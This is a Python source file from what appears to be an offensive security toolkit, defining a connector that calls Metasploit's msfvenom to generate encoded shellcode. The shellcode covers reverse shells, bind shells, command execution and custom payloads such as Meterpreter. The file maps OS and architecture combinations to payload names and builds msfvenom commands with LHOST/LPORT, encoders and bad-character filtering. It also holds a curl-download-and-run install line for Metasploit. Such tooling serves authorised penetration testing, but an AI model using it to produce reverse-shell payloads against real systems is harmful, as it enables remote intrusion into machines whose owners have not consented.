
import logging
import shutil
import subprocess

from ofx.settings import settings

from .base import ShellcodeConnector

logger = logging.getLogger(settings.app_branding)


class MsfvenomConnector(ShellcodeConnector):
    """Metasploit Framework msfvenom connector for shellcode generation.

    Provides shellcode generation using the msfvenom CLI tool from Metasploit.
    Supports multiple platforms, encoders, and bad character avoidance.

    Attributes:
        msfvenom_path: Path to msfvenom executable

    Example:
        >>> connector = MsfvenomConnector()
        >>> if connector.is_available():
        ...     shellcode = connector.generate(
        ...         os_target='linux',
        ...         arch='x64',
        ...         shell_type='reverse',
        ...         ip='192.168.1.100',
        ...         port=4444
        ...     )
    """

    # Payload mapping for common combinations
    PAYLOAD_MAP = {
        ("linux", "x86", "reverse"): "linux/x86/shell_reverse_tcp",
        ("linux", "x86", "bind"): "linux/x86/shell_bind_tcp",
        ("linux", "x86", "exec"): "linux/x86/exec",
        ("linux", "x64", "reverse"): "linux/x64/shell_reverse_tcp",
        ("linux", "x64", "bind"): "linux/x64/shell_bind_tcp",
        ("linux", "x64", "exec"): "linux/x64/exec",
        ("windows", "x86", "reverse"): "windows/shell_reverse_tcp",
        ("windows", "x86", "bind"): "windows/shell_bind_tcp",
        ("windows", "x86", "exec"): "windows/exec",
        ("windows", "x64", "reverse"): "windows/x64/shell_reverse_tcp",
        ("windows", "x64", "bind"): "windows/x64/shell_bind_tcp",
        ("windows", "x64", "exec"): "windows/x64/exec",
        ("osx", "x86", "reverse"): "osx/x86/shell_reverse_tcp",
        ("osx", "x86", "bind"): "osx/x86/shell_bind_tcp",
        ("osx", "x64", "reverse"): "osx/x64/shell_reverse_tcp",
        ("osx", "x64", "bind"): "osx/x64/shell_bind_tcp",
    }

    def __init__(self):
        """Initialize msfvenom connector."""
        super().__init__(
            name="msfvenom",
            description="Metasploit Framework msfvenom shellcode generator"
        )
        self.msfvenom_path: str | None = None

    def _check_availability(self) -> bool:
        """Check if msfvenom is available in PATH.

        Returns:
            True if msfvenom is found, False otherwise
        """
        self.msfvenom_path = shutil.which("msfvenom")
        if not self.msfvenom_path:
            logger.debug(
                "msfvenom not found in PATH. Install Metasploit Framework:\n"
                "  Ubuntu/Debian: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\n"
                "  macOS: brew install metasploit"
            )
            return False
        logger.debug(f"Found msfvenom at: {self.msfvenom_path}")
        return True

    def _get_payload_name(self, os_target: str, arch: str, shell_type: str) -> str:
        """Translate platform parameters to msfvenom payload name.

        Args:
            os_target: Operating system ('linux', 'windows', 'osx')
            arch: Architecture ('x86', 'x64')
            shell_type: Shell type ('reverse', 'bind', 'exec')

        Returns:
            Msfvenom payload name (e.g., 'linux/x64/shell_reverse_tcp')

        Raises:
            ValueError: If combination not supported
        """
        key = (os_target.lower(), arch.lower(), shell_type.lower())
        if key not in self.PAYLOAD_MAP:
            raise ValueError(
                f"Unsupported payload: {key}. Supported platforms: {list(self.PAYLOAD_MAP.keys())}"
            )
        return self.PAYLOAD_MAP[key]

    def generate(
        self,
        os_target: str,
        arch: str,
        shell_type: str,
        ip: str,
        port: int,
        bad_chars: list[str] | None = None,
        encoder: str | None = None,
        iterations: int = 1,
        custom_params: dict | None = None,
    ) -> bytes:
        """Generate shellcode using msfvenom.

        Args:
            os_target: Target OS ('linux', 'windows', 'osx')
            arch: Architecture ('x86', 'x64')
            shell_type: Shellcode type ('reverse', 'bind', 'exec')
            ip: IP address for reverse/bind shells
            port: Port number
            bad_chars: List of bad characters to avoid (e.g., ["\\x00", "\\x0a"])
            encoder: Encoder name (e.g., 'x86/shikata_ga_nai', 'x64/xor_dynamic')
            iterations: Number of encoding iterations (default: 1)
            custom_params: Additional msfvenom parameters (e.g., {'CMD': '/bin/sh'})

        Returns:
            Raw shellcode bytes

        Raises:
            RuntimeError: If msfvenom execution fails
            ValueError: If parameters are invalid

        Example:
            >>> connector = MsfvenomConnector()
            >>> shellcode = connector.generate(
            ...     os_target='linux',
            ...     arch='x64',
            ...     shell_type='reverse',
            ...     ip='10.0.0.1',
            ...     port=443,
            ...     encoder='x64/xor_dynamic',
            ...     bad_chars=['\\x00']
            ... )
        """
        if not self.is_available():
            raise RuntimeError(
                "msfvenom is not available. Install Metasploit Framework first."
            )

        self.validate_parameters(os_target, arch, shell_type, ip, port)

        payload = self._get_payload_name(os_target, arch, shell_type)
        custom_params = custom_params or {}

        # Build msfvenom command
        cmd = [self.msfvenom_path, "-p", payload]

        # Add connection parameters for reverse/bind shells
        if shell_type.lower() in ["reverse", "bind"]:
            if shell_type.lower() == "reverse":
                cmd.extend(["LHOST=" + ip, "LPORT=" + str(port)])
            else:  # bind
                cmd.extend(["RHOST=" + ip, "LPORT=" + str(port)])

        # Add custom parameters
        for key, value in custom_params.items():
            cmd.append(f"{key}={value}")

        # Add bad character avoidance
        if bad_chars:
            bad_chars_str = "".join(bad_chars)
            cmd.extend(["-b", bad_chars_str])

        # Add encoder
        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])

        # Set output format to raw
        cmd.extend(["-f", "raw"])

        logger.debug(f"Executing msfvenom: {' '.join(cmd)}")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                check=True,
                timeout=30,
            )
            shellcode = result.stdout

            if not shellcode:
                raise RuntimeError("msfvenom returned empty shellcode") from None

            logger.info(
                f"Generated shellcode with msfvenom: {len(shellcode)} bytes "
                f"(payload: {payload})"
            )

            if result.stderr:
                stderr_msg = result.stderr.decode('utf-8', errors='ignore')
                if "Payload size:" in stderr_msg:
                    logger.debug(f"msfvenom info: {stderr_msg.strip()}")

            return shellcode

        except subprocess.CalledProcessError as e:
            error_msg = e.stderr.decode('utf-8', errors='ignore') if e.stderr else str(e)
            raise RuntimeError(f"msfvenom execution failed: {error_msg}") from e
        except subprocess.TimeoutExpired:
            raise RuntimeError("msfvenom execution timed out after 30 seconds") from None
        except Exception as e:
            raise RuntimeError(f"Unexpected error running msfvenom: {e}") from e

    def get_supported_platforms(self) -> list[tuple[str, str, str]]:
        """Get list of supported platform combinations.

        Returns:
            List of (os_target, arch, shell_type) tuples
        """
        return list(self.PAYLOAD_MAP.keys())

    def list_all_payloads(self) -> list[str]:
        """List all available msfvenom payloads.

        Queries msfvenom for complete payload list. Useful for discovering
        payloads not in the predefined PAYLOAD_MAP.

        Returns:
            List of payload names

        Raises:
            RuntimeError: If msfvenom is not available

        Example:
            >>> connector = MsfvenomConnector()
            >>> payloads = connector.list_all_payloads()
            >>> 'linux/x86/meterpreter/reverse_tcp' in payloads
            True
        """
        if not self.is_available():
            raise RuntimeError("msfvenom is not available") from None

        try:
            result = subprocess.run(
                [self.msfvenom_path, "--list", "payloads"],
                capture_output=True,
                check=True,
                timeout=10,
            )
            output = result.stdout.decode('utf-8', errors='ignore')
            payloads = []
            for line in output.split('\n'):
                line = line.strip()
                if '/' in line and not line.startswith('Name'):
                    # Extract payload name (first column)
                    payload_name = line.split()[0]
                    if payload_name:
                        payloads.append(payload_name)
            return payloads
        except Exception as e:
            logger.warning(f"Failed to list msfvenom payloads: {e}")
            return []

    def generate_custom_payload(
        self,
        payload_name: str,
        params: dict,
        bad_chars: list[str] | None = None,
        encoder: str | None = None,
        iterations: int = 1,
    ) -> bytes:
        """Generate shellcode using a custom msfvenom payload name.

        Allows direct use of any msfvenom payload, not just those in PAYLOAD_MAP.

        Args:
            payload_name: Full msfvenom payload name (e.g., 'linux/x86/meterpreter/reverse_tcp')
            params: Payload parameters (e.g., {'LHOST': '10.0.0.1', 'LPORT': '4444'})
            bad_chars: Bad characters to avoid
            encoder: Encoder name
            iterations: Encoding iterations

        Returns:
            Raw shellcode bytes

        Example:
            >>> connector = MsfvenomConnector()
            >>> shellcode = connector.generate_custom_payload(
            ...     payload_name='linux/x86/meterpreter/reverse_tcp',
            ...     params={'LHOST': '192.168.1.100', 'LPORT': '4444'}
            ... )
        """
        if not self.is_available():
            raise RuntimeError("msfvenom is not available") from None

        cmd = [self.msfvenom_path, "-p", payload_name]

        for key, value in params.items():
            cmd.append(f"{key}={value}")

        if bad_chars:
            bad_chars_str = "".join(bad_chars)
            cmd.extend(["-b", bad_chars_str])

        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])

        cmd.extend(["-f", "raw"])

        logger.debug(f"Executing custom msfvenom: {' '.join(cmd)}")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                check=True,
                timeout=30,
            )
            shellcode = result.stdout

            if not shellcode:
                raise RuntimeError("msfvenom returned empty shellcode") from None

            logger.info(f"Generated custom payload: {len(shellcode)} bytes")
            return shellcode

        except subprocess.CalledProcessError as e:
            error_msg = e.stderr.decode('utf-8', errors='ignore') if e.stderr else str(e)
            raise RuntimeError(f"msfvenom execution failed: {error_msg}") from e
